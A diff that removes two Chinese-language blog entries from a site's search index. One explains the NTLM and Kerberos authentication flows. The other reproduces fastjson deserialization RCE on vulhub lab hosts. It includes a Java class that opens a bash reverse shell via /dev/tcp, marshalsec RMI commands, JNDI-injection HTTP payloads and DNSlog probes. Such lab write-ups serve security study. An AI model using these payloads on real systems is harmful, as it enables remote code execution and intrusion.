@@ -76,293 +76,6 @@
       </tags>
   </entry>
   <entry>
-    <title>NTLM及Kerberos认证流程</title>
-    <url>/articles/60487e7c/</url>
-    <content><![CDATA[<h1 id="NTLM及Kerberos认证流程"><a href="#NTLM及Kerberos认证流程" class="headerlink" title="NTLM及Kerberos认证流程"></a>NTLM及Kerberos认证流程</h1><h2 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>NTLM是NT LAN Manager的缩写，NTLM 是指 telnet 的一种验证身份方式，即问询&#x2F;应答身份验证协议，是 Windows NT 早期版本的标准安全协议，Windows 2000 支持 NTLM 是为了保持向后兼容。Windows 2000内置三种基本安全协议之一。</p>
-<h3 id="2-认证流程"><a href="#2-认证流程" class="headerlink" title="2.认证流程"></a>2.认证流程</h3><p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047697.png" alt="Snipaste_2021-09-09_13-48-24"></p>
-<p>①使用用户名和密码登录客户端，进行<strong>本地认证</strong></p>
-<p>②客户端首先在本地加密当前用户的密码为密码散列，即<strong>NTLM Hash</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:1">1</a></p>
-<p>③确认双方协议版本，客户端向服务器明文发送自己的账号</p>
-<p>④服务器生成一个16位的随机数字发送给客户端，即<strong>challenge</strong></p>
-<p>⑤客户端使用<strong>NTLM Hash</strong>来加密<strong>challenge</strong>，生成的结果即<strong>response</strong></p>
-<p>⑥服务器将<strong>明文的用户名</strong>、<strong>challenge</strong>、<strong>response</strong>发给域控制器(DC)</p>
-<p>⑦域控制器用这个用户名在<strong>SAM密码管理库</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:2">2</a>中找到此用户对应的<strong>NTLM Hash</strong>，并使用这个值来加密<strong>challenge</strong>，生成的结果记为<strong>response2</strong></p>
-<p>⑧域控制器对<strong>response</strong>和<strong>response2</strong>进行比较，如果一样则认证成功，反之则失败</p>
-<h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p>Windows不会储存用户的明文密码，而是将明文密码加密后储存在SAM中</p>
-<p>本地认证的过程中，用户登录时，系统会将用户输入的明文密码加密成<strong>NTLM Hash</strong>，然后和SAM中的<strong>NTLM Hash</strong>进行比较从而完成认证</p>
-<p>用户进行任何注销操作（注销登录，重启，锁屏等），<strong>winlogon</strong>进程会显示密码输入界面，接受用户输入密码后交给<strong>lsass</strong>进程，这个进程中会保存一份明文密码，然后加密成<strong>NTLM Hash</strong></p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; 本地认证</span><br></pre></td></tr></table></figure>
-
-<h4 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h4><ul>
-<li>用户明文密码：<code>y5neko123</code></li>
-<li>十六进制转换为：<code>79356e656b6f313233</code></li>
-<li>转换为Unicode码，相当于在每个字节后添加一个0x00：<code>790035006e0065006b006f00310032003300</code></li>
-<li>以十六进制进行MD4加密：<code>2aec2647511a853cbec96388c4ae8770</code></li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047362.png" alt="image-20210909131622932"></p>
-<h2 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1.概念"></a>1.概念</h3><p>Kerberos 是一种由 MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端&#x2F;服务器应用程序提供强身份验证。</p>
-<p>Kerberos 主要是用在域环境下的身份认证协议。</p>
-<h3 id="2-认证流程-1"><a href="#2-认证流程-1" class="headerlink" title="2.认证流程"></a>2.认证流程</h3><p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047736.png" alt="img"></p>
-<p>Kerberos 协议中主要有四个角色的存在：</p>
-<ol>
-<li>访问服务的 Client</li>
-<li>提供服务的 Server</li>
-<li>KDC（Key Distribution Center）密钥分发中心<a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:3">3</a></li>
-<li>AD（Account Database）</li>
-</ol>
-<hr>
-<h4 id="KDC的构成"><a href="#KDC的构成" class="headerlink" title="KDC的构成"></a>KDC的构成</h4><p><strong>Authentication Service</strong>：认证服务器，以下简称AS，作用就是验证 Client 端的身份，验证通过会发送一张<strong>TGT（Ticket Granting Ticket）</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:4">4</a>票据给 Client</p>
-<p><strong>Ticket Granting Service</strong>：票据分发服务器，以下简称TGS，作用是通过 AS 发送给 Client 的票据（TGT）换取<strong>ST（ServiceTicket</strong>）<a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:5">5</a>，也被称为<strong>TGS Ticket</strong></p>
-<hr>
-<p>Kerberos认证大体上分为三个流程：</p>
-<ol>
-<li>The Authentication Service Exchange：Client 与 AS 的交互</li>
-<li>The Ticket-Granting Service (TGS) Exchange：Client 与 TGS 的交互</li>
-<li>The Client&#x2F;Server Authentication Exchange：Client 与 Server 的交互</li>
-</ol>
-<hr>
-<h4 id="一、Authentication-Service-Exchange"><a href="#一、Authentication-Service-Exchange" class="headerlink" title="一、Authentication Service Exchange"></a>一、Authentication Service Exchange</h4><p><strong>KRB_AS_REQ（请求）</strong></p>
-<p>Client –&gt; AS：客户端向KDC的AS发送<strong>Authenticator1</strong>，内容包含：</p>
-<ul>
-<li>Pre-authentication data：包含用以证明自己身份的信息，一般它的内容是一个被Client hash加密过的时间戳</li>
-<li>Client name &amp; realm：用户信息</li>
-<li>TGS的Server name</li>
-</ul>
-<p><strong>KRB_AS_REP（响应）</strong></p>
-<p>AS –&gt; Client：AS根据用户名在AD中判断是否在白名单中，接着进行验证发送方是否为Client name中声称的用户</p>
-<p>也就是需要验证发送方是否知道该用户名的密码，此时只需要从AD中使用相应的<strong>NTLM Hash</strong>对请求包中的<strong>Pre-authentication data</strong>进行解密，如果是一个合法的时间戳，则说明提供的密钥无误</p>
-<p>验证成功后提取相应的<strong>NTLM Hash</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:1">1</a>，此时会生成一个随机数<strong>SessionKey</strong>，然后使用提取的<strong>NTLM Hash</strong>来加密<strong>SessionKey</strong>，生成<strong>SessionKey-as</strong>作为AS数据，再返回一个<strong>TGT</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:4">4</a></p>
-<blockquote>
-<p>  简述：在 KDC(AD) 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息，验证成功后返回给Client两个数据，由 Client 密码 HASH 加密的SessionKey-as和TGT。</p>
-</blockquote>
-<p>Client收到KRB_AS_REP，通过自己的<strong>NTLM Hash</strong>对返回的<strong>SessionKey-as</strong>进行解密得到<strong>SessionKey</strong>后，即可携带<strong>TGT</strong>进入下一步骤</p>
-<hr>
-<h4 id="二、Ticket-Granting-Service-TGS-Exchange"><a href="#二、Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="二、Ticket-Granting Service (TGS) Exchange"></a>二、Ticket-Granting Service (TGS) Exchange</h4><p><strong>KRB_TGS_REQ（请求）</strong></p>
-<p>Client –&gt; TGS：Client向KDC的TGS发送<strong>Authenticator2</strong>，内容包含：</p>
-<ul>
-<li>TGT</li>
-<li>Authenticator：用以证明当初TGT的拥有者是自己，使用SessionKey来进行加密，其中包含有客户端信息和时间戳</li>
-<li>Client name &amp; realm</li>
-<li>Server name &amp; realm：Client要访问的Server</li>
-</ul>
-<p><strong>KRB_TGS_REP（响应）</strong></p>
-<p>TGS –&gt; Client：TGS首先通过自己的NTLM Hash（krbtgt账户的NTLM Hash）对Client提供的TGT进行解密，即可得到<strong>SessionKey</strong>，再通过这个SessionKey解密Client提供的<strong>Authenticator</strong>来进行验证，此时生成一个<strong>SessionKey-tgs</strong></p>
-<p>验证成功后向对方发送两个数据：</p>
-<ul>
-<li>使用SessionKey加密<strong>SessionKey-tgs</strong>生成<strong>SessionKey-tgs-encrypt</strong>，用于Client和Server的认证</li>
-<li>使用Server的NTLM Hash加密<strong>SessionKey-tgs</strong>生成<strong>ST</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:5">5</a></li>
-</ul>
-<p>Client收到KRB_TGS_REP，使用SessionKey对返回的<strong>SessionKey-tgs-encrypt</strong>进行解密得到<strong>SessionKey-tgs</strong>，有了<strong>SessionKey-tgs</strong>和<strong>ST</strong>，Client就可以和Server交互了，至此TGS的任务完成</p>
-<hr>
-<h4 id="三、Client-Server-Authentication-Exchange"><a href="#三、Client-Server-Authentication-Exchange" class="headerlink" title="三、Client&#x2F;Server Authentication Exchange"></a>三、Client&#x2F;Server Authentication Exchange</h4><p><strong>KRB_AP_REQ（请求）</strong></p>
-<p>Client –&gt; Server：Client向Server发送<strong>Authenticator3</strong>，内容包含：</p>
-<ul>
-<li>ST</li>
-<li>Authenticator：用以证明当初TGT的拥有者是自己，使用SessionKey来进行加密，其中包含有客户端信息和时间戳</li>
-<li>Flag：用于表示Client是否需要进行双向验证</li>
-</ul>
-<p><strong>KRB_AP_REP（响应）</strong></p>
-<p>Server –&gt; Client：Server首先通过自己的NTLM Hash对收到的ST进行解密，即可得到<strong>SessionKey-tgs</strong>，再通过这个<strong>SessionKey-tgs</strong>解密收到的<strong>Authenticator</strong>即可验证身份，原理同上</p>
-<p>此时连接建立成功。</p>
-<blockquote>
-<p>  对于需要进行双向验证，Server从Authenticator提取Timestamp，使用**SessionKey(Server-Client)**进行加密，并将其发送给Client用于Client验证Server的身份。</p>
-</blockquote>
-<hr>
-<ol>
-<li>通常意义上的NTLM Hash指存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于LSASS进程中，便于 SSP（NTLM 安全支持提供程序）使用。 Account Manager Database，安全账号管理数据库 [</li>
-<li>KDC 服务默认会安装在一个域的域控中，KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li>
-<li>TGT包含：使用KDC中krbtgt账户的NTLM Hash加密的SessionKey、Client name &amp; realm以及End Time：TGT的到期时间</li>
-<li>可以用来访问 Server 端的票据，包含：SessionKey-tgs、Client name &amp; realm以及End Time：ST的到期时间</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>知识库</category>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>fastjson漏洞复现</title>
-    <url>/articles/602d9e2a/</url>
-    <content><![CDATA[<h1 id="fastjson漏洞复现"><a href="#fastjson漏洞复现" class="headerlink" title="fastjson漏洞复现"></a>fastjson漏洞复现</h1><blockquote>
-<p>  Fastjson是一个Java库，可用于将Java对象转换为其JSON表示形式。它还可以用于将JSON字符串转换为等效的Java对象,fastjson爆出多个反序列化远程命令执行漏洞，攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对fastjson版本小于1.2.48的版本通杀，autoType为关闭状态也可使用。</span><br><span class="line">loadClass中默认cache设置为true，利用分为2步执行，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.JdbcRowSetImpl这个类，绕过了黑名单机制</span><br><span class="line">该payload会利用fastjson的反序列化漏洞去指定的rmi/ldap服务进行远程方法调用</span><br></pre></td></tr></table></figure>
-
-
-
-<blockquote>
-<p>主机A： <a href="http://192.168.56.106:8090/">http://192.168.56.106:8090</a> (存在Fastjson漏洞主机)</p>
-<p>主机B： <a href="http://192.168.56.1:8989/">http://192.168.56.1:8989</a> (恶意java类服务)</p>
-<p>主机C： rmi:&#x2F;&#x2F;192.168.56.1:9999 (远程方法调用服务)</p>
-<p> PS:   实际上主机B和C是一台机器不同端口</p>
-</blockquote>
-<h2 id="fastjson-1-2-24-rce"><a href="#fastjson-1-2-24-rce" class="headerlink" title="fastjson&#x2F;1.2.24-rce"></a>fastjson&#x2F;1.2.24-rce</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用 <code>vulhub</code> 搭建 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
- <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143662.png" alt="image-20210901132856918" style="zoom:80%;" />
-
-<p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，</p>
-<p>可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p>
-<p>Command ： <code>touch /tmp/success</code>   </p>
-<blockquote>
-<h5 id="TouchFile-java"><a href="#TouchFile-java" class="headerlink" title="TouchFile.java"></a>TouchFile.java</h5></blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1：8989/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
-
-<img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143924.png" alt="image-20210901133439751" style="zoom:80%;" />
-
-<p>使用python 搭建一个简单的http服务器</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>
-
- <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143667.png" alt="image-20210901133540829" style="zoom:80%;" />
-
-<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a><strong>Payload</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144666.png" alt="image-20210901133841607"></p>
- <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144883.png" alt="image-20210901134528910" style="zoom:67%;" />
-
-
-
-<p>可见命令执行成功！漏洞成功复现</p>
-<img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312150318.png" alt="image-20210901133735111" style="zoom:67%;" />
-
-
-
-<h3 id="DNSlog-测试"><a href="#DNSlog-测试" class="headerlink" title="DNSlog 测试"></a>DNSlog 测试</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v5guyp.dnslog.cn&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144158.png" alt="image-20210901144126030"></p>
-<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>使用 <code>nc</code> 监听得到反弹shell</p>
-<blockquote>
-<h4 id="Evil-java"><a href="#Evil-java" class="headerlink" title="Evil.java"></a>Evil.java</h4></blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;/bin/bash&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-c&quot;</span><span class="punctuation">,</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/Evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
- <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144529.png" alt="image-20210901152322290" style="zoom:80%;" />
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144092.png" alt="image-20210901152340189"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1:8989/#Evil&quot; 9999</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>
-
- <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144433.png" alt="image-20210901143418464" style="zoom:80%;" />
-
-
-
-<h3 id="fastjson-rce-tool"><a href="#fastjson-rce-tool" class="headerlink" title="fastjson_rce_tool"></a><a href="https://github.com/wyzxxz/fastjson_rce_tool">fastjson_rce_tool</a></h3><p>使用  <code>fastjson_rce_tool</code> 快速getshell</p>
-<p><a href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.56.1 8888  &quot;bash=bash -i &gt;&amp;/dev/tcp/192.168.56.1/9090 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-
- <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145473.png" alt="image-20210901151615763" style="zoom:80%;" />
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 129</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;: &quot;rmi://192.168.56.1:8888/Object&quot;,</span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
- <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144374.png" alt="image-20210901152003880" style="zoom:80%;" />
-
-
-
-
-
-<h2 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson&#x2F;1.2.47-rce"></a>fastjson&#x2F;1.2.47-rce</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p>
-<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用 <code>vulhub</code> 搭建 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145045.png" alt="image-20210901185209143"></p>
-<h3 id="GetShell-1"><a href="#GetShell-1" class="headerlink" title="GetShell"></a>GetShell</h3><p>使用 <code>nc</code> 监听得到反弹shell</p>
-<blockquote>
-<h4 id="Evil-java-1"><a href="#Evil-java-1" class="headerlink" title="Evil.java"></a>Evil.java</h4></blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;/bin/bash&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-c&quot;</span><span class="punctuation">,</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/Evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
- <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145880.png" alt="image-20210901152322290" style="zoom:80%;" />
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312156180.png" alt="image-20210901152340189"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1:8989/#Evil&quot; 9999</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>
-
- <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145814.png" alt="image-20210901143418464" style="zoom:80%;" />
-
-
-
-<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="未知目标是否使用-Fastjson-，但站点有原始报错回显"><a href="#未知目标是否使用-Fastjson-，但站点有原始报错回显" class="headerlink" title="未知目标是否使用 Fastjson ，但站点有原始报错回显"></a><strong>未知目标是否使用 Fastjson ，但站点有原始报错回显</strong></h3><p>如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样</p>
-<p>例如</p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145526.png" alt="image-20200704162617071"></p>
-<h3 id="无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><a href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson" class="headerlink" title="无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson"></a><strong>无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</strong></h3><p>我使用以下payload测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;745shj.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
